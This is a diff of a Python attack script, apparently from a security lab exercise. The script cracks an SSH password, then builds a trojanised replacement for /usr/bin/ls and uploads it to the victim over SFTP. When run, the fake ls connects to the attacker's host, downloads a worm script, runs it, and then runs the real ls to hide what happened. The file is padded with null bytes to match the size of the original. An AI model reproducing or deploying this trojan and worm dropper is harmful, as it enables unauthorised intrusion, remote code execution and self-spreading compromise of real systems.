@@ -7,8 +7,7 @@ import itertools
 import os
 import subprocess
 import binascii
-from zipfile import ZipFile
-# from virus import zip_ls, build_virus
+from zipfile import ZipFile, ZIP_DEFLATED
 
 victim_ip = sys.argv[1]
 attacker_ip = sys.argv[2]
@@ -29,60 +28,73 @@ def ssh_login(host, port, username, password):
     finally:
         client.close()
 
-def zip_ls():
-    subprocess.run(["zip", "-j", "/tmp/ls.zip", "/usr/bin/ls"], stdout=subprocess.DEVNULL)
+def temp_ls_sign(payload):
+    ls_path = "/usr/bin/ls"
+    fake_ls_path = "temp_ls"
+
+    org_size = os.path.getsize(ls_path)
+    temp_size = len(payload)
+
+    with open(fake_ls_path, "ab") as f:
+        padding_size = org_size - temp_size - 4
+        f.write(b'\x00' * padding_size)
+        f.write(b'\xaa\xbb\xcc\xdd')
+
+def compress_ls():
+    with ZipFile('/tmp/ls.zip', "w", ZIP_DEFLATED) as f:
+        f.write('/usr/bin/ls',arcname='ls')
     with open("/tmp/ls.zip", "rb") as f:
         return f.read()
 
-def build_virus(attacker_ip, attacker_port, ls_zip):
+def compression_virus(attacker_ip, attacker_port, ls_zip):
     ls_hex = binascii.hexlify(ls_zip)
 
-    code = f"""#!/usr/bin/python3
+    payload = f"""#!/usr/bin/python3
 import sys
 import os
 import socket
 import binascii
 from zipfile import ZipFile
+import subprocess
 
 ls_bytes = {ls_hex}.decode('utf-8')
 
-def get_worm(ip, pt):
-    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    skt.connect((ip, pt))
-    rcv_f = 'worm.py'
-    with open(rcv_f, 'wb') as f:
+def worm_transfer(ip, port):
+    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    victim_socket.connect((ip, port))
+    recv_file = 'worm.py'
+    with open(recv_file, 'wb') as f:
         while True:
-            data = skt.recv(1024)
+            data = victim_socket.recv(1024)
             if not data:
                 break
             f.write(data)
-    skt.close()
+    victim_socket.close()
 
-def run():
-    get_worm("{attacker_ip}", {attacker_port})
-    os.system("python3 worm.py && rm worm.py")
+    
+def execution():
+    worm_transfer("{attacker_ip}", {attacker_port})
+    subprocess.run(["python3", "worm.py"], check=True)
+    subprocess.run(["rm", "worm.py"])
 
-    orig_ls = binascii.unhexlify(ls_bytes)
+    true_ls = binascii.unhexlify(ls_bytes)
     with open("/tmp/ls.zip", 'wb') as f:
-        f.write(orig_ls)
+        f.write(true_ls)
     with ZipFile("/tmp/ls.zip", "r") as f:
         f.extractall("/tmp/")
-    os.system("rm /tmp/ls.zip && chmod +x /tmp/ls")
-    ret = os.system("/tmp/ls "+" ".join(sys.argv[1:]))
-    os.system("rm /tmp/ls")
-    return ret
-    
+    subprocess.run(["chmod", "+x", "/tmp/ls"])
+    subprocess.run(["rm", "/tmp/ls.zip"])
+    result = subprocess.run(["/tmp/ls"] + sys.argv[1:], check=False).returncode
+    subprocess.run(["rm", "/tmp/ls"])
+    return result
+
 if __name__ == "__main__":
-    run()
+    execution()
     """
 
-    ls_size = os.path.getsize("/usr/bin/ls")
-    with open("fake_ls", "wb") as f:
-        f.write(code.encode())
-    new_size = os.path.getsize("fake_ls")
-    with open("fake_ls", "ab") as f: # append byte mode
-        f.write(b'\x00' * (ls_size - new_size - 4))
-        f.write(b'\xaa\xbb\xcc\xdd')
+    with open("temp_ls", "wb") as f:
+        f.write(payload.encode())
+    temp_ls_sign(payload)
 
 def main():
     # task1: crack ssh password
@@ -114,14 +126,13 @@ def main():
 
         # compress the /usr/bin/ls file in attacker
         # then send the compressed file to the victim
-        build_virus(attacker_ip, attacker_port, zip_ls())
+        compression_virus(attacker_ip, attacker_port, compress_ls())
         sftp = client.open_sftp()
-        sftp.put('./fake_ls', '/app/ls')
+        sftp.put('./temp_ls', '/app/ls')
         client.exec_command('chmod +x /app/ls')
         client.close()
         
-
-
+    subprocess.run(["rm", "./temp_ls"])
 
 if __name__ == '__main__':
     main()
